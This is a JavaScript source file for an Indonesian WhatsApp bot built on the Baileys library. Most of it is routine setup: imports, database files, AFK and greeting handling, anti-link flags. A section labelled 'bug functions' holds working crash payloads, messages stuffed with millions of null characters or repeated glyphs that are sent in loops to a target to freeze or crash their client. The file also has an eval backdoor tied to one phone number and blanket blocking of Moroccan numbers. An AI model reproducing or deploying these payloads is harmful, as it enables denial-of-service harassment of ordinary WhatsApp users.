require('./settings')
require('./lib/listmenu')
const startTime = Date.now()
const {
	downloadContentFromMessage
} = require('@whiskeysockets/baileys')
const { modul } = require('./module')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, nodecron, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const canvafy = require('canvafy')
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const { color, bgcolor } = require('./lib/color')
const { TelegraPh } = require('./lib/uploader')
const { fetchBuffer, buffermagef } = require("./lib/myfunc2")
const { uptotelegra } = require('./scrape/upload')
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const JavaScriptObfuscator = require('javascript-obfuscator');
const fg = require('api-dylux')
const { msgFilter } = require('./lib/antispam')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const textpro = require('./scrape/textpro')
const textpro2 = require('./scrape/textpro2')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const dansyaverifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
const NanoVoiceNote = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonvn.json'))
const NanoSticker = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonsticker.json'))
const ImageNano = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonimage.json'))
const VideoNano = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonvideo.json'))
const BadNano = JSON.parse(fs.readFileSync('./database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
const chatnano = JSON.parse(fs.readFileSync('./database/chatnano.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
// Deklarasi startTime di bagian atas file
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// read database
let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []

module.exports = NanoBotz = async (NanoBotz, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

const budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
 const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'

async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: NanoBotz.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, NanoBotz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
NanoBotz.ev.emit('messages.upsert', msg)
}
         
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await NanoBotz.decodeJid(NanoBotz.user.id)
        const DanzTheCreator = [botNumber, ...global.owner, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
const isSenderIncluded = DanzTheCreator.includes(m.sender);
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await NanoBotz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     const jangan = m.isGroup ? pler.includes(m.chat) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = dansyaverifikasiuser.includes(sender)
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
      const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
      const isnanochat = m.isGroup ? chatnano.includes(m.chat) : true
      const shouldExit = true
      const automati = false
       
      const isAutosimi = m.isGroup ? siminya.includes(m.chat) : true
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : true
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const antibot = true
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isSimi = siminya.includes(m.chat) ? true : false 
const nanototalpitur = () =>{
            var mytext = fs.readFileSync("./Nano.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var nanoliatwaktu = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var nanoliatwaktu = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var nanoliatwaktu = `Selamat Malam 🌃`
 }
 if(time2 < "15:00:00"){
var nanoliatwaktu = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var nanoliatwaktu = `Selamat pagi 🌄`
 }
 if(time2 < "05:00:00"){
var nanoliatwaktu = `Selamat Pagi 🌄`
 } 

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)

		if (isEval && senderNumber == "+6282268881337") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await NanoBotz.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				NanoBotz.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,


}

// Menangani pengguna yang sedang AFK
// Menangani pengguna yang sedang AFK
let mentionUsers = [...new Set([
    ...(m.mentionedJid || []), 
    ...(m.quoted ? [m.quoted.sender] : [])
])];

for (let jid of mentionUsers) {
    let user = db.users[jid];
    if (!user) continue;

    let afkTime = user.afkTime;
    if (!afkTime || afkTime < 0) continue;

    let reason = user.afkReason || 'tanpa alasan';
    let afkDuration = clockString(new Date - afkTime);

    let responseMessage = `🚫 *Jangan tag dia!*\n` +
                          `💬 *Dia sedang AFK:* ${reason}\n` +
                          `⏳ *Selama:* ${afkDuration}`;

    m.reply(responseMessage.trim());
}

// Menangani pengguna yang berhenti AFK
if (db.users[m.sender].afkTime > -1) {
    let user = db.users[m.sender];
    let afkDuration = clockString(new Date - user.afkTime);
    let reasonMessage = user.afkReason ? ' setelah ' + user.afkReason : '';

    let stopMessage = `🎉 *${m.sender.split('@')[0]} berhenti AFK*\n${reasonMessage}\n` +
                      `⏳ *Selama:* ${afkDuration}`;

    m.reply(stopMessage);
    user.afkTime = -1;
    user.afkReason = '';
}





const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = true
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: true,
    		auto_ai_grup: true,
    		goodbye: true,
    		onlygrub: false,
        welcome: true, 
    		autoread: true
	    }

} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !DanzTheCreator) return
}


if (!NanoBotz.public) {
if (!m.key.fromMe) return
}

// auto message

//=========================================\\
//=========================================\\
//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
dansyaverifikasiuser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(dansyaverifikasiuser, null, 2))
}

NanoBotz.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan Tag Dia!
Dia AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 Kuis Matematika 🎮\tidak ada Jawaban Benar 🎉\dan Mau Main Lagi? Mengirim ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*Wrong Answer!*')

        }

function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}


		// auto set bio
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await NanoBotz.updateProfileStatus(`${NanoBotz.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return NanoBotz.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return 
}


//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await NanoBotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
async function sendXeonBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await NanoBotz.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const replynano = m.reply

const reply = m.reply

//bug functions
const sendReaction = async reactionContent => {
  NanoBotz.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   NanoBotz.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(900000)
            })
          })
        }
      }
    }, {});
    NanoBotz.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(9000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await NanoBotz.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 900000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await NanoBotz.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(90000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await NanoBotz.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  NanoBotz.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(90000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  NanoBotz.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 864100000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessagesdansya(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessagesdansya(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return NanoBotz.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return NanoBotz.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
NanoBotz.sendImageAsSticker = async (jid, media, m, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
    let jancok = new Sticker(media, {
        pack: global.packname, // The pack name
        author: global.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['🤩', '🎉'], // The sticker category
        id: '12345', // The sticker id
        quality: 50, // The quality of the output file
        background: '#FFFFFF00' // The sticker background color (only for full stickers)
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await NanoBotz.sendMessage(jid,{sticker: nah},{quoted: m})
    return await fs.unlinkSync(stok)
     }

